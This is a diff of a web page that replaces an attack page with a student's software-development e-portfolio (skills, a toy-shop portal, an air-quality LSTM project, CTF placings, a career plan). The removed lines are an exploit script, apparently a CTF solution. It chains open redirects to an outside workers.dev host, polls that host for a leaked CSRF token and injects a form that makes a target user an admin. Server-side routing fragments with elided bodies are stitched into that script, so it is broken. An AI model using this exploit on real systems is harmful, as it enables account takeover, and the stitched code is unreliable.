@@ -1,91 +1,573 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Law Ho Chun — Software Developer E-Portfolio</title>
+  <meta name="description" content="E-Portfolio of a Higher Diploma in Software Development student — showcasing skills, projects, and career goals.">
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+
+  <link rel="stylesheet" href="styles.css">
+</head>
 <body>
-<script>
-const STREAM_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev";
-const TARGET_ORIGIN = "http://localhost:5000";
-const TARGET_USER_ID = "3d169293-eeb2-40aa-adca-022f44e9c7bd";
-const id = "run200";
 
-const host = new URL(STREAM_BASE).host;
-const innerTheme =
-  `../../switch_theme?theme=light&redirect_path=//${host}/stream/${id}`;
+  <!-- ===================== NAVIGATION ===================== -->
+  <nav class="navbar" id="navbar">
+    <div class="nav-inner">
+      <a href="#hero" class="nav-logo">SDD<span>Portfolio</span></a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation">
+        <i data-lucide="menu" class="icon-24"></i>
+      </button>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#about" class="nav-link">About Me</a></li>
+        <li><a href="#skills" class="nav-link">Skills</a></li>
+        <li><a href="#projects" class="nav-link">Projects</a></li>
+        <li><a href="#activities" class="nav-link">Activities</a></li>
+        <li><a href="#career" class="nav-link">Career Goal</a></li>
+      </ul>
+    </div>
+  </nav>
 
-const victimUrl =
-  `${TARGET_ORIGIN}/switch_theme?theme=${encodeURIComponent(innerTheme)}&redirect_path=/edit_user`;
+  <!-- ===================== HERO ===================== -->
+  <section class="hero" id="hero">
+    <div class="hero-bg-blob"></div>
+    <div class="hero-content reveal">
+      <div class="hero-avatar">
+        <div class="avatar-placeholder">
+          <img src="./1750403160383.jpg">
+        </div>
+      </div>
+      <h1 class="hero-name">Law Ho Chun</h1>
+      <p class="hero-title">Higher Diploma in Software Development Student</p>
+      <p class="hero-tagline">Passionate about building clean, efficient, and user-friendly software solutions.</p>
+      <div class="hero-buttons">
+        <a href="#projects" class="btn btn-primary">
+          <i data-lucide="folder-open" class="icon-18"></i> View My Work
+        </a>
+        <a href="#contact" class="btn btn-secondary">
+          <i data-lucide="mail" class="icon-18"></i> Get In Touch
+        </a>
+      </div>
+    </div>
+    <div class="hero-scroll-hint">
+      <i data-lucide="chevron-down" class="icon-24"></i>
+    </div>
+  </section>
 
-let victimWin = null;
-let finished = false;
+  <main>
 
-function openVictim() {
-  victimWin = window.open(victimUrl, "victim");
-}
+    <!-- ===================== PART A: ABOUT ME ===================== -->
+    <section class="section" id="about">
+      <div class="container">
+        <div class="section-label">Part A</div>
+        <h2 class="section-title">About Me</h2>
+        <div class="about-grid">
+          <div class="about-text reveal">
+            <h3>Self-Introduction</h3>
+            <p>
+              Hello! I am <strong>Law Ho Chun</strong>, currently pursuing a
+              <strong>Higher Diploma in Software Development</strong> at
+              Hong Kong Institute of Information Technology. I have always been fascinated by how
+              technology can solve real-world problems, and that curiosity led me to
+              pursue a career in software engineering.
+            </p>
+            <p>
+              I enjoy the process of turning ideas into functional software — from
+              designing the user interface to writing the logic that powers it. I am
+              particularly interested in <strong>full-stack development</strong> and
+              aspire to build applications that are not only technically sound but also
+              intuitive and accessible to users.
+            </p>
+            <p>
+              Outside of coding, I enjoy listening music,
+              reading about new technologies, and
+              participating in CTF. These activities keep
+              me creative and motivated to keep learning.
+            </p>
+          </div>
+          <div class="about-info reveal">
+            <div class="info-card">
+              <h4><i data-lucide="graduation-cap" class="icon-18"></i> Education</h4>
+              <p><strong>Higher Diploma in Software Development</strong></p>
+              <p>Hong Kong Institute of Information Technology</p>
+              <p>2024 – Present</p>
+            </div>
+            <div class="info-card">
+              <h4><i data-lucide="star" class="icon-18"></i> Key Competencies</h4>
+              <ul class="competency-list">
+                <li>Proficiency in multiple programming languages</li>
+                <li>Problem-solving and logical thinking</li>
+                <li>Team collaboration and communication</li>
+                <li>Attention to detail and code quality</li>
+                <li>Self-directed learning and research</li>
+              </ul>
+            </div>
+            <div class="info-card">
+              <h4><i data-lucide="link" class="icon-18"></i> Connect With Me</h4>
+              <div class="social-links">
+                <a href="https://github.com/Sunny7890987" target="_blank" rel="noopener" class="social-link">
+                  <i data-lucide="github" class="icon-18"></i> GitHub
+                </a>
+                <a href="mailto:240127503@stu.vtc.edu.hk" class="social-link">
+                  <i data-lucide="mail" class="icon-18"></i> Email
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
 
-async function getState() {
-  const r = await fetch(`${STREAM_BASE}/state/${id}?r=${Math.random()}`, {
-    cache: "no-store"
-  });
-  return await r.json();
-}
+    <!-- ===================== SKILLS ===================== -->
+    <section class="section section-alt" id="skills">
+      <div class="container">
+        <div class="section-label">Part A — Competencies</div>
+        <h2 class="section-title">Technical Skills</h2>
+        <div class="skills-grid">
+          <div class="skills-technical reveal">
+            <h3>Programming & Technologies</h3>
+            <div class="skill-bars">
+              <div class="skill-item">
+                <div class="skill-header">
+                  <span class="skill-name">Python</span>
+                  <span class="skill-pct">0%</span>
+                </div>
+                <div class="skill-bar-track">
+                  <div class="skill-bar-fill" data-width="75"><span></span></div>
+                </div>
+                <p class="skill-note">Used for data analysis, automation scripts, and backend logic.</p>
+              </div>
+              <div class="skill-item">
+                <div class="skill-header">
+                  <span class="skill-name">Java</span>
+                  <span class="skill-pct">0%</span>
+                </div>
+                <div class="skill-bar-track">
+                  <div class="skill-bar-fill" data-width="70"><span></span></div>
+                </div>
+                <p class="skill-note">Object-oriented programming, desktop applications, and data structures.</p>
+              </div>
+              <div class="skill-item">
+                <div class="skill-header">
+                  <span class="skill-name">JavaScript</span>
+                  <span class="skill-pct">0%</span>
+                </div>
+                <div class="skill-bar-track">
+                  <div class="skill-bar-fill" data-width="65"><span></span></div>
+                </div>
+                <p class="skill-note">Dynamic web interactions, DOM manipulation, and asynchronous programming.</p>
+              </div>
+              <div class="skill-item">
+                <div class="skill-header">
+                  <span class="skill-name">HTML & CSS</span>
+                  <span class="skill-pct">0%</span>
+                </div>
+                <div class="skill-bar-track">
+                  <div class="skill-bar-fill" data-width="80"><span></span></div>
+                </div>
+                <p class="skill-note">Semantic markup, responsive layouts, and modern CSS styling techniques.</p>
+              </div>
+              <div class="skill-item">
+                <div class="skill-header">
+                  <span class="skill-name">SQL / Databases</span>
+                  <span class="skill-pct">0%</span>
+                </div>
+                <div class="skill-bar-track">
+                  <div class="skill-bar-fill" data-width="60"><span></span></div>
+                </div>
+                <p class="skill-note">Database design, SQL queries, and data management with MySQL/SQLite.</p>
+              </div>
+              <div class="skill-item">
+                <div class="skill-header">
+                  <span class="skill-name">C# / .NET</span>
+                  <span class="skill-pct">0%</span>
+                </div>
+                <div class="skill-bar-track">
+                  <div class="skill-bar-fill" data-width="55"><span></span></div>
+                </div>
+                <p class="skill-note">Desktop application development using Windows Forms and .NET framework.</p>
+              </div>
+            </div>
+          </div>
+          <div class="skills-soft reveal">
+            <h3>Soft Skills & Attributes</h3>
+            <div class="soft-skills-tags">
+              <span class="tag">Problem Solving</span>
+              <span class="tag">Team Collaboration</span>
+              <span class="tag">Communication</span>
+              <span class="tag">Time Management</span>
+              <span class="tag">Self-Directed Learning</span>
+              <span class="tag">Attention to Detail</span>
+              <span class="tag">Critical Thinking</span>
+              <span class="tag">Adaptability</span>
+              <span class="tag">Creativity</span>
+              <span class="tag">Debugging</span>
+            </div>
+            <div class="soft-skills-cards">
+              <div class="soft-skill-card">
+                <i data-lucide="users" class="icon-24"></i>
+                <h4>Team Player</h4>
+                <p>Experienced working in group projects, communicating ideas clearly and supporting teammates to achieve shared goals.</p>
+              </div>
+              <div class="soft-skill-card">
+                <i data-lucide="lightbulb" class="icon-24"></i>
+                <h4>Analytical Thinker</h4>
+                <p>Approaches complex problems by breaking them down systematically, evaluating options, and implementing effective solutions.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
 
-function sendFinal(token) {
-  if (finished) return;
-  finished = true;
+    <!-- ===================== PART A: PROJECTS ===================== -->
+    <section class="section" id="projects">
+      <div class="container">
+        <div class="section-label">Part A — Personal Competency &amp; Artifacts</div>
+        <h2 class="section-title">Featured Projects</h2>
+        <div class="projects-grid">
 
-  const js = `javascript:(() => {
-    const f = document.createElement('form');
-    f.method = 'POST';
-    f.action = '/edit_user';
-    f.innerHTML = \`
-      <input name="user_id" value="${TARGET_USER_ID}">
-      <input name="username" value="">
-      <input name="password" value="">
-      <input name="role" value="admin">
-      <input name="csrf_token" value="${token}">
-    \`;
-    document.body.appendChild(f);
-    f.submit();
-  })()`;
+          <!-- Project 1 -->
+          <article class="project-card reveal">
+            <div class="project-image">
+              <div class="project-image-placeholder">
+                <i data-lucide="shopping-cart" class="icon-48"></i>
+                <span>JQUERY TOY PORTAL SYSTEM</span>
+              </div>
+              <div class="project-tags">
+                <span class="tag tag-tech">jQuery</span>
+                <span class="tag tag-tech">JavaScript</span>
+                <span class="tag tag-tech">HTML/CSS</span>
+                <span class="tag tag-tech">localStorage</span>
+              </div>
+            </div>
+            <div class="project-body">
+              <h3>Smile &amp; Sunshine Toys Portal System</h3>
+              <p class="project-role"><i data-lucide="user" class="icon-14"></i> My Role: Front-End / Web Developer</p>
+              <p>
+                A <strong>jQuery-based web application</strong> for a toy shop that supports
+                customer registration, login, product browsing, ordering, and custom quotation
+                requests. The system includes both <strong>customer</strong> and <strong>sales staff</strong>
+                workflows, creating a complete portal for managing toy purchases and quotation services.
+              </p>
+              <ul class="project-highlights">
+                <li>Built user registration and login flows with role-based navigation for customers and sales personnel</li>
+                <li>Implemented product browsing, wishlist, shopping cart, checkout, and order tracking modules</li>
+                <li>Developed a custom toy quotation system with quote request, tracking, and application management pages</li>
+                <li>Used jQuery and browser localStorage to manage interactions, user data, and order-related records</li>
+              </ul>
+              <div class="project-footer">
+                <a href="./jQueryProj-main.zip" class="btn btn-sm btn-outline">
+                  <i data-lucide="folder" class="icon-14"></i> Project Files
+                </a>
+                <a href="#projects" class="btn btn-sm btn-ghost">
+                  <i data-lucide="code-2" class="icon-14"></i> Featured Project
+                </a>
+              </div>
+            </div>
+          </article>
 
-  victimWin.location = js;
-}
+          <!-- Project 2 -->
+          <article class="project-card reveal">
+            <div class="project-image">
+              <div class="project-image-placeholder">
+                <i data-lucide="cpu" class="icon-48"></i>
+                <span>AQHI AI FORECAST MODEL</span>
+              </div>
+              <div class="project-tags">
+                <span class="tag tag-tech">Python</span>
+                <span class="tag tag-tech">TensorFlow/Keras</span>
+                <span class="tag tag-tech">scikit-learn</span>
+                <span class="tag tag-tech">Pandas</span>
+              </div>
+            </div>
+            <div class="project-body">
+              <h3>AQHI Prediction Using LSTM Neural Network</h3>
+              <p class="project-role"><i data-lucide="user" class="icon-14"></i> My Role: AI / Machine Learning Developer</p>
+              <p>
+                An AI project that predicts the <strong>Air Quality Health Index (AQHI)</strong>
+                from historical air quality data. I used <strong>Python</strong> to clean the
+                dataset, generate AQHI values from multiple pollutant indicators, and train a
+                <strong>stacked LSTM model</strong> for time-series forecasting.
+              </p>
+              <ul class="project-highlights">
+                <li>Preprocessed air quality data by converting formats, handling missing values, and selecting numeric features</li>
+                <li>Calculated AQHI from multiple pollutant measurements and normalized the sequence data for training</li>
+                <li>Built a four-layer LSTM network with dropout to predict future AQHI values from 60-step sequences</li>
+                <li>Evaluated model performance using RMSE, MAE, classification accuracy, and a confusion matrix</li>
+              </ul>
+              <div class="project-footer">
+                <a href="aqhi_lstm_project.py" class="btn btn-sm btn-outline" target="_blank" rel="noopener">
+                  <i data-lucide="code-2" class="icon-14"></i> View Project Code
+                </a>
+              </div>
+            </div>
+          </article>
 
-async function poll() {
-  const st = await getState();
-  console.log(st);
+        </div>
+      </div>
+    </section>
 
-  if (st.done && st.token) {
-    sendFinal(st.token);
-    return;
-  }
-  setTimeout(poll, 80);
-}
-const mStream = url.pathname.match(/^\/stream\/([^/]+)\.css$/);
-if (mStream) {
-  const sid = mStream[1];
-  console.log("STREAM", sid, request.headers.get("user-agent"));
-  const session = getSession(sid);
-  ...
-}
+    <!-- ===================== PART A: ACTIVITIES ===================== -->
+    <section class="section section-alt" id="activities">
+      <div class="container">
+        <div class="section-label">Part A — Activities &amp; Achievements</div>
+        <h2 class="section-title">Extracurricular Activities</h2>
+        <div class="activities-grid">
 
-const mHit = url.pathname.match(/^\/hit\/([^/]+)$/);
-if (mHit) {
-  const sid = mHit[1];
-  const x = url.searchParams.get("x") || "";
-  console.log("HIT", sid, x);
-  const session = getSession(sid);
-  ...
-}
+          <!-- Activity 1 -->
+          <div class="activity-card reveal">
+            <div class="activity-icon">
+              <i data-lucide="shield" class="icon-32"></i>
+            </div>
+            <div class="activity-content">
+              <div class="activity-meta">
+                <span class="activity-year">2026</span>
+                <span class="tag tag-role">Competitor</span>
+              </div>
+              <h3>PolyU and NuttyShelly CTF 2026 — Top 1 in Higher Sub-degree Category</h3>
+              <p>
+                Participated in the <strong>PolyU and NuttyShelly CTF 2026</strong> and achieved
+                <strong>Top 1 in the higher sub-degree category</strong>. The competition required
+                strong skills in cybersecurity, logical analysis, and solving technical challenges
+                under time pressure.
+              </p>
+              <p>
+                This achievement strengthened my <strong>problem-solving ability</strong>,
+                <strong>CTF techniques</strong>, and confidence in handling real-world security
+                tasks through teamwork, persistence, and fast decision-making.
+              </p>
+            </div>
+          </div>
 
-const mState = url.pathname.match(/^\/state\/([^/]+)$/);
-if (mState) {
-  const sid = mState[1];
-  console.log("STATE", sid);
-  const session = getSession(sid);
-  ...
-}
-openVictim();
-poll();
-</script>
+          <!-- Activity 2 -->
+          <div class="activity-card reveal">
+            <div class="activity-icon">
+              <i data-lucide="trophy" class="icon-32"></i>
+            </div>
+            <div class="activity-content">
+              <div class="activity-meta">
+                <span class="activity-year">2026</span>
+                <span class="tag tag-role">Competitor</span>
+              </div>
+              <h3>HKCERT CTF 2026 — Top 5</h3>
+              <p>
+                Also took part in <strong>HKCERT CTF 2026</strong> and earned a <strong>Top 5</strong>
+                result. This competition involved security-related tasks such as analysis,
+                exploitation, and investigation, requiring accuracy and efficient teamwork.
+              </p>
+              <p>
+                Through this experience, I further developed my <strong>technical resilience</strong>,
+                <strong>cybersecurity knowledge</strong>, and ability to perform well in a competitive
+                environment.
+              </p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================== PART B: CAREER GOAL & PLAN ===================== -->
+    <section class="section" id="career">
+      <div class="container">
+        <div class="section-label">Part B</div>
+        <h2 class="section-title">Career Goal &amp; Plan</h2>
+
+        <!-- Career Goal -->
+        <div class="career-goal-block reveal">
+          <div class="career-goal-icon">
+            <i data-lucide="target" class="icon-36"></i>
+          </div>
+          <div>
+            <h3>My Career Goal</h3>
+            <blockquote class="career-goal-quote">
+              "As a student pursuing a Higher Diploma in Software Development, I am committed
+              to harnessing my knowledge and skills to become a <strong>Full-Stack Developer</strong>.
+              My career goal is to design and implement scalable, user-friendly web and desktop
+              applications that solve real-world problems, while continuously growing as a
+              software professional."
+            </blockquote>
+          </div>
+        </div>
+
+        <!-- Steps & Roadmap -->
+        <div class="career-steps reveal">
+          <h3>Steps to Reach My Goal</h3>
+          <div class="roadmap">
+            <div class="roadmap-item">
+              <div class="roadmap-dot"></div>
+              <div class="roadmap-content">
+                <span class="roadmap-phase">Phase 1 — Foundation</span>
+                <h4>Build a Strong Technical Foundation</h4>
+                <p>Master the core programming fundamentals (Python, Java, JavaScript, HTML/CSS) through coursework and self-study. Complete all school projects with high quality, focusing on clean code and good practices.</p>
+                <span class="tag">Ongoing</span>
+              </div>
+            </div>
+            <div class="roadmap-item">
+              <div class="roadmap-dot"></div>
+              <div class="roadmap-content">
+                <span class="roadmap-phase">Phase 2 — Specialization</span>
+                <h4>Learn Full-Stack Technologies</h4>
+                <p>Deepen knowledge in front-end frameworks (React), back-end development (Node.js / Flask), and databases. Earn certifications such as freeCodeCamp, Coursera, or AWS Cloud Practitioner.</p>
+                <div class="roadmap-tags">
+                  <span class="tag">React</span>
+                  <span class="tag">Node.js</span>
+                  <span class="tag">AWS</span>
+                  <span class="tag">Docker</span>
+                </div>
+              </div>
+            </div>
+            <div class="roadmap-item">
+              <div class="roadmap-dot"></div>
+              <div class="roadmap-content">
+                <span class="roadmap-phase">Phase 3 — Experience</span>
+                <h4>Gain Real-World Experience</h4>
+                <p>Secure an internship or part-time position in a software development team. Apply classroom knowledge to real projects, learn industry workflows (Agile, CI/CD, code reviews), and build professional references.</p>
+                <span class="tag">Target: [Year]</span>
+              </div>
+            </div>
+            <div class="roadmap-item">
+              <div class="roadmap-dot"></div>
+              <div class="roadmap-content">
+                <span class="roadmap-phase">Phase 4 — Career Launch</span>
+                <h4>Launch as a Professional Developer</h4>
+                <p>Graduate with a strong portfolio, land an entry-level Full-Stack Developer or Software Engineer role. Continue learning and aim for mid-level seniority within 2–3 years.</p>
+                <span class="tag">Target: [Year]</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Skills to Learn -->
+        <div class="skills-to-learn reveal">
+          <h3>Necessary Skills to Learn</h3>
+          <div class="skills-learn-grid">
+            <div class="skill-learn-card">
+              <div class="skill-learn-header">
+                <i data-lucide="code-2" class="icon-20"></i>
+                <h4>React / Frontend Frameworks</h4>
+              </div>
+              <p>Essential for building modern, responsive user interfaces. I plan to learn React through online courses (e.g., Codecademy, freeCodeCamp) and build personal projects.</p>
+              <p class="skill-learn-when"><strong>When:</strong> Within the next 6 months</p>
+            </div>
+            <div class="skill-learn-card">
+              <div class="skill-learn-header">
+                <i data-lucide="server" class="icon-20"></i>
+                <h4>Node.js / Backend Development</h4>
+              </div>
+              <p>Server-side programming to complement my frontend skills and enable full-stack development. I'll follow the Node.js official documentation and build API-driven projects.</p>
+              <p class="skill-learn-when"><strong>When:</strong> Within 8–12 months</p>
+            </div>
+            <div class="skill-learn-card">
+              <div class="skill-learn-header">
+                <i data-lucide="container" class="icon-20"></i>
+                <h4>Docker &amp; Cloud Basics (AWS/Azure)</h4>
+              </div>
+              <p>Containerization and cloud services are fundamental in modern software deployment. I'll start with Docker tutorials and the free AWS Cloud Practitioner course.</p>
+              <p class="skill-learn-when"><strong>When:</strong> Within 12 months</p>
+            </div>
+            <div class="skill-learn-card">
+              <div class="skill-learn-header">
+                <i data-lucide="git-branch" class="icon-20"></i>
+                <h4>Advanced Git &amp; CI/CD</h4>
+              </div>
+              <p>Version control workflows, branching strategies, and continuous integration. I'll learn through the Atlassian Git tutorial and apply it to all my projects going forward.</p>
+              <p class="skill-learn-when"><strong>When:</strong> Ongoing — starting now</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ===================== PART C: DESIGN NOTE ===================== -->
+    <section class="section section-alt" id="design-note">
+      <div class="container">
+        <div class="section-label">Part C</div>
+        <h2 class="section-title">Portfolio Design &amp; Presentation</h2>
+        <div class="design-note-grid reveal">
+          <div class="design-note-card">
+            <i data-lucide="layout-list" class="icon-32"></i>
+            <h4>Organization</h4>
+            <ul>
+              <li>Clear labeled sections: About Me, Skills, Projects, Activities, Career Goals</li>
+              <li>Logical information order: Introduction → Evidence → Future Plans</li>
+              <li>Consistent section headings and visual hierarchy throughout</li>
+            </ul>
+          </div>
+          <div class="design-note-card">
+            <i data-lucide="type" class="icon-32"></i>
+            <h4>Typography &amp; Readability</h4>
+            <ul>
+              <li>Font family: Inter (clean, modern, easy to read)</li>
+              <li>Bullet points and short paragraphs throughout</li>
+              <li>Clear contrast between headings, body text, and captions</li>
+              <li>Monospace font (JetBrains Mono) for technical tags</li>
+            </ul>
+          </div>
+          <div class="design-note-card">
+            <i data-lucide="palette" class="icon-32"></i>
+            <h4>Visual Elements</h4>
+            <ul>
+              <li>Dark theme with professional blue and green accents</li>
+              <li>Profile photo section in About Me</li>
+              <li>Animated skill bars to visualize proficiency levels</li>
+              <li>Project cards with technology tags and screenshots</li>
+              <li>Activity cards with icons and role badges</li>
+              <li>Career roadmap timeline with phase labels</li>
+            </ul>
+          </div>
+          <div class="design-note-card">
+            <i data-lucide="smartphone" class="icon-32"></i>
+            <h4>Responsive Design</h4>
+            <ul>
+              <li>Optimized for desktop, tablet, and mobile devices</li>
+              <li>Smooth scroll navigation with active section highlighting</li>
+              <li>Hover effects and scroll-reveal animations for engagement</li>
+              <li>Mobile-friendly hamburger menu for small screens</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ===================== FOOTER / CONTACT ===================== -->
+  <footer class="footer" id="contact">
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-intro">
+          <h2>Let's Connect</h2>
+          <p>Interested in working together or have a question? Feel free to reach out.</p>
+        </div>
+        <div class="footer-links">
+          <a href="https://github.com/Sunny7890987" target="_blank" rel="noopener" class="footer-link">
+            <i data-lucide="github" class="icon-20"></i> GitHub
+          </a>
+          <a href="mailto:240127503@stu.vtc.edu.hk" class="footer-link">
+            <i data-lucide="mail" class="icon-20"></i> Email
+          </a>
+          <a href="https://www.linkedin.com/in/ho-chun-law-0a7a05370/" target="_blank" rel="noopener" class="footer-link">
+            <i data-lucide="linkedin" class="icon-20"></i> LinkedIn
+          </a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>SDD4007 E-Portfolio &mdash; [Your Full Name] &copy; [Current Year]</p>
+        <p class="footer-note">This E-portfolio is prepared for SDD4007 Enhancing Competencies in the 21st Century Workplace (AY2025/26).</p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="script.js"></script>
 </body>
 </html>
